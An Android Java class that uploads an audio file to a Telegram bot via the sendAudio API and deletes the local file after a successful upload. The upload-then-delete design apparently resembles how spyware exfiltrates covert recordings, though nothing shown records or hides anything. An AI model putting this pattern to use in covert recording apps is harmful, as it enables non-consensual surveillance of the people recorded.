package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";
    private static final String TELEGRAM_API = "https://api.telegram.org";
    private OkHttpClient httpClient;
    
    public TelegramUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    public boolean uploadAudio(String filePath, String botToken, String chatId, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return false;
            
            RequestBody fileBody = RequestBody.create(file, MediaType.parse("audio/mpeg"));
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.getName(), fileBody)
                .addFormDataPart("caption", caption)
                .build();
            
            String url = TELEGRAM_API + "/bot" + botToken + "/sendAudio";
            Request request = new Request.Builder().url(url).post(requestBody).build();
            Response response = httpClient.newCall(request).execute();
            
            if (response.isSuccessful()) {
                file.delete();
                return true;
            }
            response.close();
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
            return false;
        }
    }
}
